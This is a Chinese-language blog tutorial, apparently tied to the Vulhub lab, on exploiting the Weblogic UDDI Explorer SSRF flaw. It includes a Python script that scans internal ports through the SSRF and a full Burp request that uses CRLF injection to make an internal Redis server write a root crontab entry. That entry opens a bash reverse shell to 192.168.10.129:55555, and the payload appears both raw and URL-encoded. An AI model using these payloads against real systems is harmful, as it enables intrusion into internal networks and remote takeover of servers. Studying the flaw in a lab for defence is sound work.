**目录**

[Weblogic SSRF](#t0)

[探测内网信息](#t1)

[攻击内网redis应用](#t2)

* * *

> [Weblogic](https://so.csdn.net/so/search?q=Weblogic&spm=1001.2101.3001.7020)中存在一个SSRF漏洞，利用该漏洞攻击者可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

关于SSRF漏洞我们就不讲了，传送门——> [SSRF(服务端请求伪造)漏洞](https://blog.csdn.net/qq_36119192/article/details/84980510 "SSRF(服务端请求伪造)漏洞")

Weblogic SSRF
-------------

该漏洞存在于：[http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp](http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp "http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp") 页面，我们向该页面提交以下参数：

```
http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://ip:port
```


在operator这个参数的位置存在SSRF漏洞，我们可以将该参数写成任意需要探测的主机+端口：http://ip:port

建议这里的ip不要填写 127.0.0.1 ，而是填写服务器的ip地址。因为如果这里的ip用的是127.0.0.1的话，除了7001端口，其他端口检测都是关闭的，但是实际上其他端口有开放的。

![](https://img-blog.csdnimg.cn/20201120113359994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

探测开放的端口，有三种情况：

*   端口开放，服务可识别，但是探测的是本地7001端口，返回：The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error.
*   端口开放，但是服务不可识别(非http协议)，返回：which did not have a valid SOAP content-type: null.
*   端口开放，服务可识别(http协议)，返回：which did not have a valid SOAP content-type: text/html: charset-UTF-8

![](https://img-blog.csdnimg.cn/20201120115034153.png)

![](https://img-blog.csdnimg.cn/20190503214800606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

探测关闭的端口，会返回 could not connect over HTTP to server

![](https://img-blog.csdnimg.cn/20200110095342258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 探测内网信息

所以我们可以利用weblogic的这个SSRF探测[内网](https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91&spm=1001.2101.3001.7020)的一些信息。如主机端口的开放情况等。

*   weblogic服务器ip：172.19.0.3
*   内网redis服务器ip：172.19.0.2

写了个脚本来探测内网主机端口的开放情况。

```
import requests       
def tance(ip,port):      
	url="http://xx.xx.xx.xx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://"+ip+":"+port      
	resp=requests.get(url)      
	if "could not connect over HTTP to server" in resp.text:      
		print("[-]："+ip+":"+port+"  is closed")      
	else:      
		print("[+]："+ip+":"+port+"   is open！"+"*"*30)       1
f2=open("port.txt","r",encoding="utf-8")      1
ports=f2.readlines()       1
with open("ip.txt","r",encoding="utf-8") as f:      1
	ips=f.readlines()      1
	for ip in ips:      1
		ip=ip.strip()      1
		for port in ports:      1
			port=port.strip()      2
			tance(ip,port)
```


### ![](https://img-blog.csdnimg.cn/20201120160346868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 攻击内网redis应用

Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入**%0a%0d**来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。

首先，通过ssrf探测内网中的redis服务器

![](https://img-blog.csdnimg.cn/20201120144708867.png)

我们通过写入定时任务反弹shell的命令如下：

```
set xx "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.10.129/55555 0>&1\n\n\n\n"      
config set dir /etc/      
config set dbfilename crontab      
save
```


对应的URL编码如下,每一行的换行符是 \\r\\n，对应的就是 %0D%0A 。

```
set%20xx%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.10.129%2F55555%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```


![](https://img-blog.csdnimg.cn/2020112015373336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用burp发包，这里在这反弹命令前面和后面，我们加几个换行符  test%0D%0A%0D%0A

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%20xx%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.10.129%2F55555%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Atest HTTP/1.1      
Host: xx.xx.xx.xx:7001      
Cache-Control: max-age=0      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3      
Accept-Encoding: gzip, deflate      
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      
Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; rememberMe=1; JSESSIONID=n1n2f37WxsT640zyT9YG4KQYb5Qb6bPp1hCtCWy9MRhzp2GTGp1J!-2120275894      1
Connection: close
```


![](https://img-blog.csdnimg.cn/20201211162210324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者用脚本直接反弹

![](https://img-blog.csdnimg.cn/20201120150923817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/#/environments/weblogic/ssrf/ "Vulhub - Docker-Compose file for vulnerability environment")

相关文章：[SSRF(服务端请求伪造)漏洞](https://xie1997.blog.csdn.net/article/details/84980510 "SSRF(服务端请求伪造)漏洞")